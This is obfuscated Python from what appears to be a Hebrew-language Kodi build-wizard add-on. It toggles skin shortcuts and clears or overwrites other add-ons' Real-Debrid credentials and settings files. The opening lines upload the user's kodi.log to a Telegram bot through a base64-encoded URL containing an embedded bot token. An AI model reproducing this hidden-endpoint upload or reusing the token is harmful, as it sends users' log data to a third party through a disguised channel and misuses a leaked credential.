         O0000O0000OO0O000 ={'chat_id':(None ,'-274262389'),'document':(O0OOO00O00OO00O0O ,open (O0OOO00O00OO00O0O ,'rb')),}#line:584
         OOOO00O0O0OO00O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:585
         OO000OO0O0OOO0OOO =requests .post (OOOO00O0O0OO00O00 .decode ('base64'),files =O0000O0000OO0O000 )#line:587
      elif xbmc .getCondVisibility ('system.platform.android'):#line:588
           O0OOO00O00OO00O0O =xbmc .translatePath ('special://temp/kodi.log')#line:589
           O0000O0000OO0O000 ={'chat_id':(None ,'-274262389'),'document':(O0OOO00O00OO00O0O ,open (O0OOO00O00OO00O0O ,'rb')),}#line:593
           OOOO00O0O0OO00O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:594
           OO000OO0O0OOO0OOO =requests .post (OOOO00O0O0OO00O00 .decode ('base64'),files =O0000O0000OO0O000 )#line:596
      else :#line:597
           O0OOO00O00OO00O0O =xbmc .translatePath ('special://kodi.log')#line:598
           O0000O0000OO0O000 ={'chat_id':(None ,'-274262389'),'document':(O0OOO00O00OO00O0O ,open (O0OOO00O00OO00O0O ,'rb')),}#line:602
           OOOO00O0O0OO00O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:603
           OO000OO0O0OOO0OOO =requests .post (OOOO00O0O0OO00O00 .decode ('base64'),files =O0000O0000OO0O000 )#line:605
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:606
def rdoff ():#line:608
	OOO0O0OO0OO0OO00O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:609
	OOO0O0OO0OO0OO00O .setSetting ('rd.client_id','')#line:610
	OOO0O0OO0OO0OO00O .setSetting ('rd.secret','')#line:611
	OOO0O0OO0OO0OO00O .setSetting ('rdsource','false')#line:612
	OOO0O0OO0OO0OO00O .setSetting ('super_fast_type_toren','false')#line:613
	OOO0O0OO0OO0OO00O .setSetting ('rd.auth','false')#line:614
	OOO0O0OO0OO0OO00O .setSetting ('rd.refresh','false')#line:615
	OOO0O0OO0OO0OO00O =xbmcaddon .Addon ('script.module.resolveurl')#line:617
	OOO0O0OO0OO0OO00O .setSetting ('RealDebridResolver_client_id','')#line:618
	OOO0O0OO0OO0OO00O .setSetting ('RealDebridResolver_client_secret','')#line:619
	OOO0O0OO0OO0OO00O .setSetting ('RealDebridResolver_token','')#line:620
	OOO0O0OO0OO0OO00O .setSetting ('RealDebridResolver_refresh','')#line:621
	OOO0O0OO0OO0OO00O =xbmcaddon .Addon ('plugin.video.seren')#line:623
	OOO0O0OO0OO0OO00O .setSetting ('rd.client_id','')#line:624
	OOO0O0OO0OO0OO00O .setSetting ('rd.secret','')#line:625
	OOO0O0OO0OO0OO00O .setSetting ('rd.auth','')#line:626
	OOO0O0OO0OO0OO00O .setSetting ('rd.refresh','')#line:627
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:628
		OOO0O0OO0OO0OO00O =xbmcaddon .Addon ('plugin.video.gaia')#line:629
		OOO0O0OO0OO0OO00O .setSetting ('accounts.debrid.realdebrid.id','')#line:630
		OOO0O0OO0OO0OO00O .setSetting ('accounts.debrid.realdebrid.secret','')#line:631
		OOO0O0OO0OO0OO00O .setSetting ('accounts.debrid.realdebrid.token','')#line:632
		OOO0O0OO0OO0OO00O .setSetting ('accounts.debrid.realdebrid.refresh','')#line:633
	resloginit .resloginit ('restore','all')#line:634
	O0O00OO0OOO0OO0O0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:636
	OO0000000OO0OO000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:637
	copyfile (O0O00OO0OOO0OO0O0 ,OO0000000OO0OO000 )#line:638
def skindialogsettind18 ():#line:639
	try :#line:640
		OO0OO0O0OOO0O00O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:641
		OO00O0O0OO000O0O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:642
		copyfile (OO0OO0O0OOO0O00O0 ,OO00O0O0OO000O0O0 )#line:643
	except :pass #line:644
def rdon ():#line:645
	loginit .loginIt ('restore','all')#line:646
	OOOOO0O000O0O00OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:648
	O0000000O0000O00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:649
	copyfile (OOOOO0O000O0O00OO ,O0000000O0000O00O )#line:650
def adults18 ():#line:652
  O00OOO0000O0O0OOO =(ADDON .getSetting ("adults"))#line:653
  if O00OOO0000O0O0OOO =='true':#line:654
    OO0O00OOO0O0OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:655
    with open (OO0O00OOO0O0OOO00 ,'r')as O0OO000000000O00O :#line:656
      O00O00OOOO0O00O0O =O0OO000000000O00O .read ()#line:657
    O00O00OOOO0O00O0O =O00O00OOOO0O00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:675
    with open (OO0O00OOO0O0OOO00 ,'w')as O0OO000000000O00O :#line:678
      O0OO000000000O00O .write (O00O00OOOO0O00O0O )#line:679
def rdbuildaddon ():#line:680
  O0000OOOOOOOOOOO0 =(ADDON .getSetting ("auto_rd"))#line:681
  if O0000OOOOOOOOOOO0 =='true':#line:682
    O00OOO0000OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:683
    with open (O00OOO0000OOO0O00 ,'r')as O0O0O000OOO000000 :#line:684
      O0O00O00O0OO0O00O =O0O0O000OOO000000 .read ()#line:685
    O0O00O00O0OO0O00O =O0O00O00O0OO0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:703
    with open (O00OOO0000OOO0O00 ,'w')as O0O0O000OOO000000 :#line:706
      O0O0O000OOO000000 .write (O0O00O00O0OO0O00O )#line:707
    O00OOO0000OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:711
    with open (O00OOO0000OOO0O00 ,'r')as O0O0O000OOO000000 :#line:712
      O0O00O00O0OO0O00O =O0O0O000OOO000000 .read ()#line:713
    O0O00O00O0OO0O00O =O0O00O00O0OO0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:731
    with open (O00OOO0000OOO0O00 ,'w')as O0O0O000OOO000000 :#line:734
      O0O0O000OOO000000 .write (O0O00O00O0OO0O00O )#line:735
    O00OOO0000OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:739
    with open (O00OOO0000OOO0O00 ,'r')as O0O0O000OOO000000 :#line:740
      O0O00O00O0OO0O00O =O0O0O000OOO000000 .read ()#line:741
    O0O00O00O0OO0O00O =O0O00O00O0OO0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:759
    with open (O00OOO0000OOO0O00 ,'w')as O0O0O000OOO000000 :#line:762
      O0O0O000OOO000000 .write (O0O00O00O0OO0O00O )#line:763
    O00OOO0000OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:767
    with open (O00OOO0000OOO0O00 ,'r')as O0O0O000OOO000000 :#line:768
      O0O00O00O0OO0O00O =O0O0O000OOO000000 .read ()#line:769
    O0O00O00O0OO0O00O =O0O00O00O0OO0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:787
    with open (O00OOO0000OOO0O00 ,'w')as O0O0O000OOO000000 :#line:790
      O0O0O000OOO000000 .write (O0O00O00O0OO0O00O )#line:791
    O00OOO0000OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:794
    with open (O00OOO0000OOO0O00 ,'r')as O0O0O000OOO000000 :#line:795
      O0O00O00O0OO0O00O =O0O0O000OOO000000 .read ()#line:796
    O0O00O00O0OO0O00O =O0O00O00O0OO0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:814
    with open (O00OOO0000OOO0O00 ,'w')as O0O0O000OOO000000 :#line:817
      O0O0O000OOO000000 .write (O0O00O00O0OO0O00O )#line:818
    O00OOO0000OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:820
    with open (O00OOO0000OOO0O00 ,'r')as O0O0O000OOO000000 :#line:821
      O0O00O00O0OO0O00O =O0O0O000OOO000000 .read ()#line:822
    O0O00O00O0OO0O00O =O0O00O00O0OO0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:840
    with open (O00OOO0000OOO0O00 ,'w')as O0O0O000OOO000000 :#line:843
      O0O0O000OOO000000 .write (O0O00O00O0OO0O00O )#line:844
    O00OOO0000OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:846
    with open (O00OOO0000OOO0O00 ,'r')as O0O0O000OOO000000 :#line:847
      O0O00O00O0OO0O00O =O0O0O000OOO000000 .read ()#line:848
    O0O00O00O0OO0O00O =O0O00O00O0OO0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:866
    with open (O00OOO0000OOO0O00 ,'w')as O0O0O000OOO000000 :#line:869
      O0O0O000OOO000000 .write (O0O00O00O0OO0O00O )#line:870
    O00OOO0000OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:873
    with open (O00OOO0000OOO0O00 ,'r')as O0O0O000OOO000000 :#line:874
      O0O00O00O0OO0O00O =O0O0O000OOO000000 .read ()#line:875
    O0O00O00O0OO0O00O =O0O00O00O0OO0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:893
    with open (O00OOO0000OOO0O00 ,'w')as O0O0O000OOO000000 :#line:896
      O0O0O000OOO000000 .write (O0O00O00O0OO0O00O )#line:897
def rdbuildinstall ():#line:900
  try :#line:901
   OOOOO0O0000O0O0O0 =(ADDON .getSetting ("auto_rd"))#line:902
   if OOOOO0O0000O0O0O0 =='true':#line:903
     O00O00000OO0OO0O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:904
     OOOO000OO0O0O0OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:905
     copyfile (O00O00000OO0OO0O0 ,OOOO000OO0O0O0OO0 )#line:906
  except :#line:907
     pass #line:908
def rdbuildaddonoff ():#line:911
    O0OO00O0O00OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:914
    with open (O0OO00O0O00OOOO00 ,'r')as OOO0OOOO0O0O0000O :#line:915
      OOOOO0OO0OOOO0000 =OOO0OOOO0O0O0000O .read ()#line:916
    OOOOO0OO0OOOO0000 =OOOOO0OO0OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:934
    with open (O0OO00O0O00OOOO00 ,'w')as OOO0OOOO0O0O0000O :#line:937
      OOO0OOOO0O0O0000O .write (OOOOO0OO0OOOO0000 )#line:938
    O0OO00O0O00OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:942
    with open (O0OO00O0O00OOOO00 ,'r')as OOO0OOOO0O0O0000O :#line:943
      OOOOO0OO0OOOO0000 =OOO0OOOO0O0O0000O .read ()#line:944
    OOOOO0OO0OOOO0000 =OOOOO0OO0OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:962
    with open (O0OO00O0O00OOOO00 ,'w')as OOO0OOOO0O0O0000O :#line:965
      OOO0OOOO0O0O0000O .write (OOOOO0OO0OOOO0000 )#line:966
    O0OO00O0O00OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:970
    with open (O0OO00O0O00OOOO00 ,'r')as OOO0OOOO0O0O0000O :#line:971
      OOOOO0OO0OOOO0000 =OOO0OOOO0O0O0000O .read ()#line:972
    OOOOO0OO0OOOO0000 =OOOOO0OO0OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:990
    with open (O0OO00O0O00OOOO00 ,'w')as OOO0OOOO0O0O0000O :#line:993
      OOO0OOOO0O0O0000O .write (OOOOO0OO0OOOO0000 )#line:994
    O0OO00O0O00OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:998
    with open (O0OO00O0O00OOOO00 ,'r')as OOO0OOOO0O0O0000O :#line:999
      OOOOO0OO0OOOO0000 =OOO0OOOO0O0O0000O .read ()#line:1000
    OOOOO0OO0OOOO0000 =OOOOO0OO0OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1018
    with open (O0OO00O0O00OOOO00 ,'w')as OOO0OOOO0O0O0000O :#line:1021
      OOO0OOOO0O0O0000O .write (OOOOO0OO0OOOO0000 )#line:1022
    O0OO00O0O00OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1025
    with open (O0OO00O0O00OOOO00 ,'r')as OOO0OOOO0O0O0000O :#line:1026
      OOOOO0OO0OOOO0000 =OOO0OOOO0O0O0000O .read ()#line:1027
    OOOOO0OO0OOOO0000 =OOOOO0OO0OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1045
    with open (O0OO00O0O00OOOO00 ,'w')as OOO0OOOO0O0O0000O :#line:1048
      OOO0OOOO0O0O0000O .write (OOOOO0OO0OOOO0000 )#line:1049
    O0OO00O0O00OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1051
    with open (O0OO00O0O00OOOO00 ,'r')as OOO0OOOO0O0O0000O :#line:1052
      OOOOO0OO0OOOO0000 =OOO0OOOO0O0O0000O .read ()#line:1053
    OOOOO0OO0OOOO0000 =OOOOO0OO0OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1071
    with open (O0OO00O0O00OOOO00 ,'w')as OOO0OOOO0O0O0000O :#line:1074
      OOO0OOOO0O0O0000O .write (OOOOO0OO0OOOO0000 )#line:1075
    O0OO00O0O00OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1077
    with open (O0OO00O0O00OOOO00 ,'r')as OOO0OOOO0O0O0000O :#line:1078
      OOOOO0OO0OOOO0000 =OOO0OOOO0O0O0000O .read ()#line:1079
    OOOOO0OO0OOOO0000 =OOOOO0OO0OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1097
    with open (O0OO00O0O00OOOO00 ,'w')as OOO0OOOO0O0O0000O :#line:1100
      OOO0OOOO0O0O0000O .write (OOOOO0OO0OOOO0000 )#line:1101
    O0OO00O0O00OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1104
    with open (O0OO00O0O00OOOO00 ,'r')as OOO0OOOO0O0O0000O :#line:1105
      OOOOO0OO0OOOO0000 =OOO0OOOO0O0O0000O .read ()#line:1106
    OOOOO0OO0OOOO0000 =OOOOO0OO0OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1124
    with open (O0OO00O0O00OOOO00 ,'w')as OOO0OOOO0O0O0000O :#line:1127
      OOO0OOOO0O0O0000O .write (OOOOO0OO0OOOO0000 )#line:1128
def rdbuildinstalloff ():#line:1131
    try :#line:1132
       OO0OO0O00O0OO0O0O =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1133
       OO0OOO0O0OOO0OOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1134
       copyfile (OO0OO0O00O0OO0O0O ,OO0OOO0O0OOO0OOO0 )#line:1136
       OO0OO0O00O0OO0O0O =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1138
       OO0OOO0O0OOO0OOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1139
       copyfile (OO0OO0O00O0OO0O0O ,OO0OOO0O0OOO0OOO0 )#line:1141
       OO0OO0O00O0OO0O0O =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1143
       OO0OOO0O0OOO0OOO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1144
       copyfile (OO0OO0O00O0OO0O0O ,OO0OOO0O0OOO0OOO0 )#line:1146
       OO0OO0O00O0OO0O0O =ADDONPATH +"/resources/rdoff/Splash.png"#line:1149
       OO0OOO0O0OOO0OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1150
       copyfile (OO0OO0O00O0OO0O0O ,OO0OOO0O0OOO0OOO0 )#line:1152
    except :#line:1154
       pass #line:1155
def rdbuildaddonON ():#line:1162
    OOOOO00O0O000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1164
    with open (OOOOO00O0O000OO0O ,'r')as OOO0OO00000O0OOO0 :#line:1165
      OO0OO00000000OO00 =OOO0OO00000O0OOO0 .read ()#line:1166
    OO0OO00000000OO00 =OO0OO00000000OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1184
    with open (OOOOO00O0O000OO0O ,'w')as OOO0OO00000O0OOO0 :#line:1187
      OOO0OO00000O0OOO0 .write (OO0OO00000000OO00 )#line:1188
